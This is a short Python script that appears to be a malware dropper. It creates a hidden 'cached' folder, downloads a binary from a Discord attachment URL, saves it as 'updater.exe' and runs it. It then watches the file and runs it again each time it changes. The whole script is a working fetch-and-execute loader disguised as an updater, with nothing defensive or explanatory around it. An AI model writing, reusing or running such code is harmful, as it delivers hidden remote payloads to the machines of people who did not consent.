import os
import requests
import subprocess
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes

class ExeFileHandler(FileSystemEventHandler):
    def __init__(self, exe_path):
        super().__init__()
        self.exe_path = exe_path

    def on_modified(self, event):
        if event.src_path == self.exe_path:
            subprocess.run([self.exe_path], shell=True)

def create_hidden_folder_and_download(repo_url, exe_filename, folder_name):
    current_dir = os.path.dirname(os.path.abspath(__file__))
    hidden_folder_path = os.path.join(current_dir, folder_name)

    try:
        os.mkdir(hidden_folder_path)

        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(hidden_folder_path, FILE_ATTRIBUTE_HIDDEN)

        response = requests.get(repo_url)
        response.raise_for_status()

        exe_path = os.path.join(hidden_folder_path, exe_filename)

        with open(exe_path, 'wb') as exe_file:
            exe_file.write(response.content)

        return exe_path
    except FileExistsError:
        pass

repo_url = "https://cdn.discordapp.com/attachments/1182028570919440467/1182028942585114774/updater_2?ex=6583353c&is=6570c03c&hm=bd1722bb13f81a5030c23da7e64ca5d2c1ddbbb590fe1c22e6554da6b1e4b0c2&"
exe_filename = 'updater.exe'
folder_name = 'cached'

downloaded_exe_path = create_hidden_folder_and_download(repo_url, exe_filename, folder_name)

if downloaded_exe_path:
    subprocess.run([downloaded_exe_path], shell=True)

    handler = ExeFileHandler(downloaded_exe_path)
    observer = Observer()
    observer.schedule(handler, path=os.path.dirname(downloaded_exe_path), recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()

    observer.join()
